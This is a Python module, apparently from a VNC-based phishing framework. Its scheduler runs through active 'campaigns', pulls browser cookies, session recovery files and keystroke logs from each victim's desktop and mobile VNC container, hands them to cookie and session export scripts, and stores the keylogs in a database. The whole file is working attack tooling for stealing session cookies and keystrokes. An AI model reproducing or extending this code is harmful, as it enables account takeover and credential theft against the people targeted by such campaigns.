"""Background data collection via APScheduler - replaces the bash while loop."""

import os
import subprocess
from datetime import datetime, timezone

from apscheduler.schedulers.background import BackgroundScheduler

from .models import db, Campaign, CampaignUser, Keylog, CollectionLog
from . import docker_manager

scheduler = BackgroundScheduler()


def start_collector(app):
    """Start the background scheduler for data collection."""
    scheduler.add_job(
        _collect_all,
        "interval",
        seconds=app.config["COLLECTION_INTERVAL"],
        args=[app],
        id="collector",
        replace_existing=True,
    )
    scheduler.start()


def run_collection(campaign_id):
    """Run collection for a single campaign (called from API)."""
    from flask import current_app
    app = current_app._get_current_object()
    _collect_campaign(app, campaign_id)


def _collect_all(app):
    """Collect data from all running campaigns."""
    with app.app_context():
        campaigns = Campaign.query.filter_by(status="running").all()
        for campaign in campaigns:
            _collect_campaign(app, campaign.id)


def _collect_campaign(app, campaign_id):
    """Collect cookies, sessions, and keylogs for a campaign."""
    with app.app_context():
        campaign = db.session.get(Campaign, campaign_id)
        if not campaign or campaign.status != "running":
            return

        output_dir = app.config["OUTPUT_DIR"]
        users = CampaignUser.query.filter_by(campaign_id=campaign_id).all()

        cookies_total = 0
        sessions_total = 0
        keylogs_total = 0

        for cu in users:
            if cu.status == "disconnected":
                continue

            # Collect from desktop VNC
            if cu.vnc_container:
                result = docker_manager.collect_data_from_container(
                    cu.vnc_container, cu.user_num * 2 - 1, output_dir, is_mobile=False,
                    browser=campaign.browser or "firefox"
                )
                _process_collected_data(output_dir, result, cu.user_num * 2 - 1, False, campaign.export_format)

                # Save keylog
                if result.get("keylog"):
                    _save_keylog(campaign_id, cu.user_num, False, result["keylog"])
                    keylogs_total += 1

            # Collect from mobile VNC
            if cu.mvnc_container:
                result = docker_manager.collect_data_from_container(
                    cu.mvnc_container, cu.user_num * 2, output_dir, is_mobile=True,
                    browser=campaign.browser or "firefox"
                )
                _process_collected_data(output_dir, result, cu.user_num * 2, True, campaign.export_format)

                if result.get("keylog"):
                    _save_keylog(campaign_id, cu.user_num, True, result["keylog"])
                    keylogs_total += 1

        # Log collection
        log = CollectionLog(
            campaign_id=campaign_id,
            cookies_count=cookies_total,
            sessions_count=sessions_total,
            keylogs_count=keylogs_total,
        )
        db.session.add(log)
        db.session.commit()


def _process_collected_data(output_dir, result, user_num, is_mobile, export_format):
    """Run the existing session-collector.py and cookies-collector.py scripts."""
    prefix = "m" if is_mobile else ""
    fmt = "simple" if export_format == "simple" else "default"

    # Run session collector
    recovery_path = result.get("recovery_path")
    if recovery_path and os.path.exists(recovery_path):
        try:
            subprocess.run(
                ["python3", os.path.join(output_dir, "session-collector.py"), recovery_path, fmt],
                cwd=output_dir, timeout=30, capture_output=True,
            )
        except Exception:
            pass
        _cleanup_file(recovery_path)

    # Run cookies collector
    cookies_path = result.get("cookies_path")
    if cookies_path and os.path.exists(cookies_path):
        try:
            subprocess.run(
                ["python3", os.path.join(output_dir, "cookies-collector.py"), cookies_path, fmt],
                cwd=output_dir, timeout=30, capture_output=True,
            )
        except Exception:
            pass
        _cleanup_file(cookies_path)


def _save_keylog(campaign_id, user_num, is_mobile, content):
    """Save or update keylog entry in the database."""
    existing = Keylog.query.filter_by(
        campaign_id=campaign_id, user_num=user_num, is_mobile=is_mobile
    ).first()
    if existing:
        existing.content = content
        existing.updated_at = datetime.now(timezone.utc)
    else:
        kl = Keylog(
            campaign_id=campaign_id,
            user_num=user_num,
            is_mobile=is_mobile,
            content=content,
        )
        db.session.add(kl)
    db.session.commit()


def _cleanup_file(path):
    """Remove a temporary file."""
    try:
        os.remove(path)
    except OSError:
        pass
